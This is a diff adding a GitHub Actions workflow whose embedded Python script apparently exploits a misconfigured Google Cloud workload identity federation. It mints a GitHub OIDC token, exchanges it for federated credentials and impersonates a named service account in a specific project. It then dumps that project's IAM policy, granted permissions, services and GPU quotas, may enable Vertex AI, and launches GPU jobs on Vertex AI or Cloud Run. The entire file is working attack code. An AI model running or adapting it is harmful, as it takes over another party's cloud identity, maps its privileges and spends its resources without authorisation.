@@ -1,0 +1,463 @@
+name: c211-i120593-mciv
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: mciv
+        required: false
+        default: 'mciv'
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  mciv:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    steps:
+      - name: mciv
+        run: |
+          python3 - <<'PYEOF'
+          import base64, json, os, time, urllib.error, urllib.parse, urllib.request
+
+          NONCE = 'i120593'
+          PROJ = 'civil-epigram-370317'
+          SA = 'sa-gcloud-cli@civil-epigram-370317.iam.gserviceaccount.com'
+          POOL_PROJ = '284735288225'
+          AUD = ('//iam.googleapis.com/projects/%s/locations/global/workloadIdentityPools/'
+                 'my-pool/providers/my-provider' % POOL_PROJ)
+          TAG = 'C211_I120593'
+
+
+          def http(url, method='GET', data=None, headers=None, timeout=60):
+              h = {'User-Agent': 'c211-i120593'}
+              if headers:
+                  h.update(headers)
+              body = None
+              if data is not None:
+                  body = json.dumps(data).encode()
+                  h['Content-Type'] = 'application/json'
+              req = urllib.request.Request(url, data=body, headers=h, method=method)
+              try:
+                  with urllib.request.urlopen(req, timeout=timeout) as f:
+                      return f.status, f.read().decode('utf-8', 'ignore')
+              except urllib.error.HTTPError as e:
+                  try:
+                      return e.code, e.read().decode('utf-8', 'ignore')
+                  except Exception:
+                      return e.code, ''
+              except Exception as e:
+                  return -1, str(e)
+
+
+          def jget(s, key, default=None):
+              try:
+                  return json.loads(s).get(key, default)
+              except Exception:
+                  return default
+
+
+          def out(tag, obj, cap=20000):
+              s = json.dumps(obj, separators=(',', ':'))
+              if len(s) > cap:
+                  s = s[:cap] + '...TRUNC'
+              print('%s_%s=%s' % (TAG, tag, s), flush=True)
+
+
+          # ---------- 1. mint GitHub OIDC token with the EXACT audience ----------
+          u = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL')
+          t = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
+          idtok = None
+          mint_err = ''
+          claims = {}
+          if not u or not t:
+              mint_err = 'NO_ACTIONS_ENV'
+          else:
+              mc, mb = http(u + ('&' if '?' in u else '?') + 'audience=' +
+                            urllib.parse.quote(AUD, safe=''),
+                            headers={'Authorization': 'Bearer ' + t})
+              idtok = jget(mb, 'value')
+              if mc != 200 or not idtok:
+                  mint_err = 'MINT_%s:%s' % (mc, mb[:200])
+              else:
+                  try:
+                      p = idtok.split('.')[1]
+                      p += '=' * (-len(p) % 4)
+                      claims = json.loads(base64.urlsafe_b64decode(p).decode('utf-8', 'ignore'))
+                  except Exception as e:
+                      claims = {'decode_error': str(e)}
+          out('MINT', {'http': 200 if idtok else -1, 'err': mint_err,
+                       'sub': claims.get('sub'), 'aud': claims.get('aud'),
+                       'repository': claims.get('repository'),
+                       'ref': claims.get('ref'),
+                       'job_workflow_ref': claims.get('job_workflow_ref')})
+          if not idtok:
+              out('FATAL', {'reason': 'no id token'})
+              raise SystemExit(0)
+
+          # ---------- 2. STS exchange ----------
+          sc, sb = http('https://sts.googleapis.com/v1/token', method='POST', data={
+              'audience': AUD,
+              'grantType': 'urn:ietf:params:oauth:grant-type:token-exchange',
+              'requestedTokenType': 'urn:ietf:params:oauth:token-type:access_token',
+              'scope': 'https://www.googleapis.com/auth/cloud-platform',
+              'subjectTokenType': 'urn:ietf:params:oauth:token-type:jwt',
+              'subjectToken': idtok})
+          fed = jget(sb, 'access_token')
+          out('STS', {'http': sc, 'ok': bool(fed),
+                      'err': '' if fed else sb[:400],
+                      'expires_in': jget(sb, 'expires_in')})
+          if not fed:
+              out('FATAL', {'reason': 'sts refused'})
+              raise SystemExit(0)
+
+          # ---------- 3. impersonate the declared SA ----------
+          ic, ib = http('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/' +
+                        urllib.parse.quote(SA, safe='') + ':generateAccessToken',
+                        method='POST',
+                        data={'scope': ['https://www.googleapis.com/auth/cloud-platform']},
+                        headers={'Authorization': 'Bearer ' + fed})
+          at = jget(ib, 'accessToken')
+          out('IMPERSONATE', {'http': ic, 'sa': SA, 'ok': bool(at),
+                              'token_len': len(at or ''),
+                              'expireTime': jget(ib, 'expireTime'),
+                              'err': '' if at else ib[:400]})
+          if not at:
+              out('FATAL', {'reason': 'impersonation refused'})
+              raise SystemExit(0)
+
+          AH = {'Authorization': 'Bearer ' + at}
+
+          def g(url, method='GET', data=None, timeout=90):
+              return http(url, method=method, data=data, headers=AH, timeout=timeout)
+
+          # ---------- 4. read-only managed-service matrix ----------
+          c, b = g('https://cloudresourcemanager.googleapis.com/v1/projects/' + PROJ)
+          out('PROJECT', {'http': c, 'body': (b if c == 200 else b)[:1500]})
+          c, b = g('https://cloudbilling.googleapis.com/v1/projects/' + PROJ + '/billingInfo')
+          out('BILLING', {'http': c, 'body': b[:600]})
+
+          # 4b. service usage: list enabled services + get the managed services
+          c, b = g('https://serviceusage.googleapis.com/v1/projects/' + PROJ +
+                   '/services?filter=state:ENABLED&pageSize=200')
+          enabled = []
+          if c == 200:
+              enabled = [s.get('config', {}).get('name') for s in (json.loads(b).get('services') or [])]
+          out('SERVICES_ENABLED', {'http': c, 'n': len(enabled), 'names': sorted(enabled)})
+          svc_state = {}
+          for svc in ['aiplatform.googleapis.com', 'run.googleapis.com',
+                      'cloudbuild.googleapis.com', 'cloudquotas.googleapis.com',
+                      'logging.googleapis.com', 'compute.googleapis.com',
+                      'artifactregistry.googleapis.com']:
+              c, b = g('https://serviceusage.googleapis.com/v1/projects/' + PROJ +
+                       '/services/' + svc)
+              svc_state[svc] = {'http': c, 'state': jget(b, 'state'),
+                                'err': '' if c == 200 else b[:200]}
+          out('SERVICES_GET', svc_state)
+
+          # 4c. project IAM policy
+          c, b = g('https://cloudresourcemanager.googleapis.com/v1/projects/' + PROJ +
+                   ':getIamPolicy', method='POST', data={})
+          pol = {}
+          if c == 200:
+              pol = json.loads(b)
+          bindings = pol.get('bindings') or []
+          mine = []
+          for bd in bindings:
+              ms = bd.get('members') or []
+              hit = [m for m in ms if (SA in m or '284735288225' in m or
+                                       'principalSet' in m or 'sa-gcloud-cli' in m)]
+              if hit:
+                  mine.append({'role': bd.get('role'), 'members': hit})
+          out('IAM_POLICY', {'http': c, 'n_bindings': len(bindings),
+                             'etag': pol.get('etag'), 'version': pol.get('version'),
+                             'matching_bindings': mine,
+                             'all_roles': sorted({bd.get('role') for bd in bindings}),
+                             'err': '' if c == 200 else b[:300]})
+
+          # 4d. testIamPermissions
+          perms = ['aiplatform.customJobs.create', 'aiplatform.customJobs.get',
+                   'aiplatform.endpoints.create', 'aiplatform.trainingPipelines.create',
+                   'aiplatform.models.upload', 'run.jobs.create', 'run.services.create',
+                   'cloudbuild.builds.create', 'serviceusage.services.enable',
+                   'serviceusage.services.get', 'iam.serviceAccounts.getAccessToken',
+                   'iam.serviceAccounts.actAs', 'resourcemanager.projects.setIamPolicy',
+                   'resourcemanager.projects.getIamPolicy', 'resourcemanager.projects.get',
+                   'compute.instances.create', 'logging.logEntries.list',
+                   'storage.buckets.create', 'artifactregistry.repositories.create',
+                   'cloudquotas.quotas.get', 'serviceusage.consumerQuotaMetrics.list']
+          c, b = g('https://cloudresourcemanager.googleapis.com/v1/projects/' + PROJ +
+                   ':testIamPermissions', method='POST', data={'permissions': perms})
+          granted = []
+          if c == 200:
+              granted = json.loads(b).get('permissions') or []
+          out('TEST_IAM', {'http': c, 'granted': sorted(granted),
+                           'denied': sorted(set(perms) - set(granted)),
+                           'err': '' if c == 200 else b[:300]})
+
+          # 4e. service-specific GPU quotas: serviceusage consumerQuotaMetrics (v1beta1, FULL)
+          cqm = {}
+          for svc in ['aiplatform.googleapis.com', 'run.googleapis.com']:
+              c, b = g('https://serviceusage.googleapis.com/v1beta1/projects/' + PROJ +
+                       '/services/' + svc + '/consumerQuotaMetrics?view=FULL&pageSize=200')
+              rows = []
+              if c == 200:
+                  for m in (json.loads(b).get('metrics') or []):
+                      for lim in (m.get('consumerQuotaLimits') or []):
+                          for bk in (lim.get('quotaBuckets') or []):
+                              dims = bk.get('dimensions') or {}
+                              eff = bk.get('effectiveLimit')
+                              if str(eff) not in ('0', 'None'):
+                                  rows.append({'metric': m.get('metric'),
+                                               'unit': lim.get('unit'),
+                                               'region': dims.get('region') or dims,
+                                               'effectiveLimit': eff})
+              cqm[svc] = {'http': c, 'nonzero': rows,
+                          'n_nonzero': len(rows),
+                          'err': '' if c == 200 else b[:300]}
+          out('CONSUMER_QUOTA', cqm)
+
+          # 4f. Cloud Quotas API quotaInfos (global) + quotaPreferences per region
+          cq = {}
+          for svc in ['aiplatform.googleapis.com', 'run.googleapis.com']:
+              c, b = g('https://cloudquotas.googleapis.com/v1/projects/' + PROJ +
+                       '/locations/global/services/' + svc + '/quotaInfos?pageSize=200')
+              rows = []
+              if c == 200:
+                  for qi in (json.loads(b).get('quotaInfos') or []):
+                      for di in (qi.get('dimensionsInfos') or []):
+                          if str((di.get('details') or {}).get('value')) not in ('0', 'None'):
+                              rows.append({'quotaId': qi.get('quotaId'),
+                                           'dims': di.get('dimensions'),
+                                           'value': (di.get('details') or {}).get('value')})
+              cq[svc] = {'http': c, 'nonzero_n': len(rows), 'rows': rows[:40],
+                         'err': '' if c == 200 else b[:300]}
+          prefs = {}
+          for rg in ['global', 'us-central1', 'us-east1']:
+              c, b = g('https://cloudquotas.googleapis.com/v1/projects/' + PROJ +
+                       '/locations/' + rg + '/quotaPreferences?pageSize=50')
+              prefs[rg] = {'http': c, 'n': len(jget(b, 'quotaPreferences') or []),
+                           'body': b[:200]}
+          out('CLOUDQUOTAS', {'quotaInfos': cq, 'quotaPreferences': prefs})
+
+          # 4g. compute accelerator availability in a few zones
+          acc = {}
+          for z in ['us-central1-a', 'us-east1-b', 'us-west1-a']:
+              c, b = g('https://compute.googleapis.com/compute/v1/projects/' + PROJ +
+                       '/zones/' + z + '/acceleratorTypes')
+              acc[z] = {'http': c,
+                        'types': [x.get('name') for x in (jget(b, 'items') or [])]
+                        if c == 200 else b[:160]}
+          out('ACCEL_TYPES', acc)
+
+          # ---------- 5. optionally enable aiplatform if merely disabled ----------
+          enables = {}
+          if svc_state.get('aiplatform.googleapis.com', {}).get('state') != 'ENABLED':
+              if 'serviceusage.services.enable' in granted:
+                  c, b = g('https://serviceusage.googleapis.com/v1/projects/' + PROJ +
+                           '/services/aiplatform.googleapis.com:enable', method='POST', data={})
+                  opname = jget(b, 'name')
+                  enables['enable_http'] = c
+                  enables['op'] = opname
+                  enables['resp'] = b[:300]
+                  if c == 200 and opname:
+                      for _ in range(40):
+                          time.sleep(10)
+                          cc, bb = g('https://serviceusage.googleapis.com/v1/' + opname)
+                          if jget(bb, 'done'):
+                              enables['op_done'] = True
+                              enables['op_resp'] = bb[:400]
+                              break
+                      c2, b2 = g('https://serviceusage.googleapis.com/v1/projects/' + PROJ +
+                                 '/services/aiplatform.googleapis.com')
+                      svc_state['aiplatform.googleapis.com'] = {
+                          'http': c2, 'state': jget(b2, 'state'),
+                          'err': '' if c2 == 200 else b2[:200]}
+                      enables['re_read'] = svc_state['aiplatform.googleapis.com']
+              else:
+                  enables['denied'] = 'serviceusage.services.enable not granted'
+          out('ENABLE_AIPLATFORM', enables)
+
+          if enables.get('op_done'):
+              time.sleep(20)
+              c, b = g('https://serviceusage.googleapis.com/v1beta1/projects/' + PROJ +
+                       '/services/aiplatform.googleapis.com/consumerQuotaMetrics?view=FULL&pageSize=200')
+              rows = []
+              if c == 200:
+                  for m in (json.loads(b).get('metrics') or []):
+                      for lim in (m.get('consumerQuotaLimits') or []):
+                          for bk in (lim.get('quotaBuckets') or []):
+                              dims = bk.get('dimensions') or {}
+                              if str(bk.get('effectiveLimit')) not in ('0', 'None'):
+                                  rows.append({'metric': m.get('metric'),
+                                               'region': dims.get('region') or dims,
+                                               'effectiveLimit': bk.get('effectiveLimit')})
+              cqm['aiplatform.googleapis.com'] = {'http': c, 'nonzero': rows,
+                                                  'n_nonzero': len(rows),
+                                                  'err': '' if c == 200 else b[:300]}
+              out('CONSUMER_QUOTA_AFTER_ENABLE', cqm['aiplatform.googleapis.com'])
+
+          # ---------- 6. ONE marker only if a managed GPU quota is nonzero ----------
+          def nonzero_quota(rows, needle):
+              res = []
+              for r in rows:
+                  if needle in (r.get('metric') or '') and \
+                     str(r.get('effectiveLimit')) not in ('0', 'None'):
+                      res.append(r)
+              return res
+
+          t4 = nonzero_quota(cqm.get('aiplatform.googleapis.com', {}).get('nonzero', []),
+                             'custom_model_training_nvidia_t4_gpu')
+          l4s = nonzero_quota(cqm.get('aiplatform.googleapis.com', {}).get('nonzero', []),
+                              'custom_model_serving_nvidia_l4_gpu')
+          run_gpu = nonzero_quota(cqm.get('run.googleapis.com', {}).get('nonzero', []),
+                                  'gpu_allocation')
+          out('MARKER_PLAN', {
+              'vertex_t4_nonzero': t4, 'vertex_l4_serving_nonzero': l4s,
+              'run_l4_allocation_nonzero': run_gpu,
+              'aiplatform_state': svc_state.get('aiplatform.googleapis.com', {}).get('state'),
+              'customJobs_create_granted': 'aiplatform.customJobs.create' in granted,
+              'run_jobs_create_granted': 'run.jobs.create' in granted})
+
+          def read_logs(filter_expr, project=PROJ):
+              c, b = http('https://logging.googleapis.com/v2/entries:list', method='POST',
+                          data={'resourceNames': ['projects/' + project],
+                                'filter': filter_expr,
+                                'orderBy': 'timestamp desc',
+                                'pageSize': 100},
+                          headers=AH, timeout=90)
+              rows = []
+              if c == 200:
+                  for e in (json.loads(b).get('entries') or []):
+                      pl = e.get('textPayload') or json.dumps(e.get('jsonPayload') or {})
+                      rows.append({'ts': e.get('timestamp'),
+                                   'res': (e.get('resource') or {}).get('labels'),
+                                   'log': pl})
+              return c, rows, b
+
+          done_marker = False
+          mk = {}
+          if t4 and 'aiplatform.customJobs.create' in granted:
+              rg = t4[0].get('region')
+              if isinstance(rg, dict):
+                  rg = rg.get('region') or 'us-central1'
+              mk['region'] = rg
+              jobid = 'c211-i120593-gpu'
+              body = {
+                  'displayName': jobid,
+                  'jobSpec': {'workerPoolSpecs': [{
+                      'machineSpec': {'machineType': 'n1-standard-4',
+                                      'acceleratorType': 'NVIDIA_TESLA_T4',
+                                      'acceleratorCount': 1},
+                      'replicaCount': 1,
+                      'containerSpec': {
+                          'imageUri': 'us-docker.pkg.dev/vertex-ai/training/pytorch-gpu.2-1:latest',
+                          'command': ['bash', '-c'],
+                          'args': ['nvidia-smi -L; nvidia-smi --query-gpu=name,uuid,'
+                                   'memory.total --format=csv,noheader; '
+                                   'echo C211_I120593_DEVICE_DONE']}}]}}
+              c, b = g('https://' + rg + '-aiplatform.googleapis.com/v1/projects/' + PROJ +
+                       '/locations/' + rg + '/customJobs', method='POST', data=body, timeout=120)
+              cj = jget(b, 'name')
+              mk['create_http'] = c
+              mk['create_resp'] = b[:800]
+              mk['job_name'] = cj
+              if c == 200 and cj:
+                  jid = cj.rsplit('/', 1)[-1]
+                  mk['job_id'] = jid
+                  state = None
+                  for _ in range(60):
+                      time.sleep(15)
+                      cc, bb = g('https://' + rg + '-aiplatform.googleapis.com/v1/' + cj)
+                      state = jget(bb, 'state')
+                      if state in ('JOB_STATE_SUCCEEDED', 'JOB_STATE_FAILED',
+                                   'JOB_STATE_CANCELLED', 'JOB_STATE_EXPIRED'):
+                          mk['final_state'] = state
+                          mk['final_get'] = bb[:1500]
+                          break
+                  mk['state'] = state
+                  time.sleep(15)
+                  lc, rows, lraw = read_logs(
+                      'resource.type="ml_job" AND resource.labels.job_id="%s"' % jid)
+                  mk['logs_http'] = lc
+                  mk['logs'] = rows[:60]
+                  if lc != 200:
+                      lc2, rows2, lraw2 = read_logs('resource.labels.job_id="%s"' % jid)
+                      mk['logs_http2'] = lc2
+                      mk['logs2'] = rows2[:40]
+                      if lc2 != 200:
+                          mk['logs_err2'] = lraw2[:300]
+                  cc, bb = g('https://' + rg + '-aiplatform.googleapis.com/v1/' + cj +
+                             ':cancel', method='POST', data={})
+                  mk['cancel_http'] = cc
+                  mk['cancel_resp'] = bb[:300]
+                  lc, bb = g('https://' + rg + '-aiplatform.googleapis.com/v1/projects/' + PROJ +
+                             '/locations/' + rg + '/customJobs?pageSize=100')
+                  names = [x.get('name') for x in (jget(bb, 'customJobs') or [])] if lc == 200 else []
+                  mk['post_list_http'] = lc
+                  mk['post_list_n'] = len(names)
+                  mk['post_list_names'] = names[:20]
+                  mc2, mb2 = g('https://' + rg + '-aiplatform.googleapis.com/v1/' + cj)
+                  mk['post_get_http'] = mc2
+                  mk['post_get_state'] = jget(mb2, 'state')
+                  done_marker = True
+              out('MARKER_VERTEX', mk)
+
+          elif run_gpu and 'run.jobs.create' in granted:
+              rg = run_gpu[0].get('region')
+              if isinstance(rg, dict):
+                  rg = rg.get('region') or 'us-central1'
+              mk['region'] = rg
+              job = 'c211-i120593-gpu'
+              body = {'template': {'template': {
+                  'containers': [{
+                      'image': 'us-docker.pkg.dev/vertex-ai/training/pytorch-gpu.2-1:latest',
+                      'command': ['bash', '-c'],
+                      'args': ['nvidia-smi -L; nvidia-smi --query-gpu=name,uuid,'
+                               'memory.total --format=csv,noheader; '
+                               'echo C211_I120593_DEVICE_DONE'],
+                      'resources': {'limits': {'nvidia.com/gpu': '1'}}}],
+                  'maxRetries': 0, 'timeout': '600s'}}}
+              c, b = g('https://run.googleapis.com/v2/projects/' + PROJ + '/locations/' + rg +
+                       '/jobs?jobId=' + job, method='POST', data=body, timeout=120)
+              mk['create_http'] = c
+              mk['create_resp'] = b[:800]
+              if c in (200, 201):
+                  c, b = g('https://run.googleapis.com/v2/projects/' + PROJ + '/locations/' + rg +
+                           '/jobs/' + job + ':run', method='POST', data={})
+                  mk['run_http'] = c
+                  mk['run_resp'] = b[:400]
+                  opname = jget(b, 'name')
+                  mk['op'] = opname
+                  if opname:
+                      for _ in range(60):
+                          time.sleep(10)
+                          cc, bb = g('https://run.googleapis.com/v2/' + opname)
+                          if jget(bb, 'done'):
+                              mk['op_done'] = True
+                              mk['op_resp'] = bb[:800]
+                              break
+                  time.sleep(10)
+                  lc, rows, lraw = read_logs('resource.type="cloud_run_job" AND '
+                                             'resource.labels.job_name="%s"' % job)
+                  mk['logs_http'] = lc
+                  mk['logs'] = rows[:60]
+                  if lc != 200:
+                      mk['logs_err'] = lraw[:300]
+                  lc, bb = g('https://run.googleapis.com/v2/projects/' + PROJ + '/locations/' +
+                             rg + '/jobs?pageSize=50')
+                  mk['post_list_http'] = lc
+                  mk['post_list'] = bb[:800]
+                  mc2, mb2 = g('https://run.googleapis.com/v2/projects/' + PROJ + '/locations/' +
+                               rg + '/jobs/' + job)
+                  mk['post_get_http'] = mc2
+                  mk['post_get_body'] = mb2[:400]
+                  done_marker = True
+              out('MARKER_RUN', mk)
+
+          out('SUMMARY', {'marker_attempted': done_marker,
+                          'vertex_t4_n': len(t4), 'run_gpu_n': len(run_gpu),
+                          'aiplatform': svc_state.get('aiplatform.googleapis.com', {}).get('state'),
+                          'run': svc_state.get('run.googleapis.com', {}).get('state'),
+                          'granted_n': len(granted), 'nonce': NONCE})
+          print('%s_END' % TAG, flush=True)
+          PYEOF
